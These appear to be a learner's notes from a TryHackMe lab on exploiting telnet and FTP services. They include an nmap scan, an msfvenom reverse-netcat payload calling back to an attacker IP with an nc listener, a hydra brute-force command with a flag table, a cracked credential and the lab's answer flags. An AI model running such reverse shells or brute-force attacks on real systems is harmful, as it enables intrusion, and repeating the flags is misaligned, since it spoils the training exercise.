@@ -1,0 +1,49 @@
+# Nmap 7.93 scan initiated Fri Apr 14 06:24:54 2023 as: nmap -p 8012 -v -oN nmap-output.out. 10.10.60.157
+Nmap scan report for 10.10.60.157
+Host is up (0.25s latency).
+
+PORT     STATE SERVICE
+8012/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Fri Apr 14 06:25:08 2023 -- 1 IP address (1 host up) scanned in 13.54 seconds
+
+
+telnet 10.10.192.224 8012
+
+sudo tcpdump ip proto \\icmp -i tun0 : listen   
+
+ping [local THM ip] -c 1
+
+msfvenom -p cmd/unix/reverse_netcat lhost=10.8.85.62 lport=4444 R
+
+nc -lvp 4444
+
+
+flag : THM{y0u_g0t_th3_t3ln3t_fl4g}
+
+FTP :
+
+hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
+
+SECTION                          FUNCTION
+
+hydra                        Runs the hydra tool
+
+-t 4                         Number of parallel connections per target
+
+-l [user]                    Points to the user who's account you're trying to compromise
+
+-P [path to dictionary]      Points to the file containing the list of possible passwords
+
+-vV                          Sets verbose mode to very verbose, shows the login+pass combination for each attempt
+
+[machine IP]                 The IP address of the target machine
+
+ftp / protocol               Sets the protocol
+
+
+
+mike : password
+
+finnal flag: THM{y0u_g0t_th3_ftp_fl4g}
